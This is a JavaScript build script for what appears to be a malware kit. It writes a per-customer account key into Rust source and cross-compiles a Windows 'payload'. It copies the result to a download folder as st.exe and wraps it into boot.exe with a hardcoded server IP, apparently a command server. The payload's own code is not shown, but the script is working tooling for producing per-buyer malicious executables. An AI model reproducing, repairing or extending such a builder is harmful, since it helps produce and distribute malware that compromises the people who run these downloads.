// language: JavaScript, file: builder/rustbuild.js
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { compileLauncher } from './compile.js';

const execFileP = promisify(execFile);
const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT_DIR = path.join(__dirname, '..');
const DOWNLOAD_DIR = path.join(ROOT_DIR, 'download');

export async function buildBoot({ key, buildId }) {
  let rustDir = path.join(ROOT_DIR, 'client');
  if (!fs.existsSync(rustDir)) rustDir = ROOT_DIR;

  const srcDir = path.join(rustDir, 'src');
  if (!fs.existsSync(srcDir)) {
    fs.mkdirSync(srcDir, { recursive: true });
  }

  const embeddedKeyPath = path.join(srcDir, 'embedded_key.rs');
  fs.writeFileSync(embeddedKeyPath, `pub const ACCOUNT_KEY: &str = "${key}";\n`);

  console.log('[build] compiling rust payload...');
  try {
    // Increased timeout to 15 minutes, limited to 2 threads to prevent server OOM
    await execFileP('cargo', ['build', '--release', '--target', 'x86_64-pc-windows-gnu', '-j', '2'], {
      cwd: rustDir,
      timeout: 15 * 60_000, 
      maxBuffer: 64 * 1024 * 1024,
    });
  } catch (e) {
    // If it's a timeout, tell the user clearly.
    if (e.killed) {
      throw new Error('cargo failed: Build timed out after 15 minutes. Try running "cargo clean" and building again.');
    }

    // Extract the actual error from the end of the log
    const fullLog = (e.stdout || '') + '\n' + (e.stderr || '');
    const errorLines = fullLog.split('\n').filter(l => l.includes('error[') || l.includes('error:') || l.includes('panicked'));
    
    const actualError = errorLines.length > 0 
      ? errorLines.join('\n') 
      : fullLog.slice(-2000); // Show last 2000 chars if no explicit "error:" line

    console.error('[build] cargo failed:', actualError);
    throw new Error(`cargo failed:\n${actualError}`);
  }

  // Check for boot.exe
  const baseExe = path.join(rustDir, 'target', 'x86_64-pc-windows-gnu', 'release', 'boot.exe');
  if (!fs.existsSync(baseExe)) {
    throw new Error(`rust build missing output at ${baseExe}`);
  }

  // Copy to download/st.exe
  if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });
  fs.copyFileSync(baseExe, path.join(DOWNLOAD_DIR, 'st.exe'));

  console.log('[build] wrapping into boot.exe...');
  
  const bootBuf = await compileLauncher({ 
    key, 
    buildId,
    config: { ip: process.env.SERVER_IP || '95.182.96.216' }, 
    baseExe 
  });
  
  return bootBuf;
}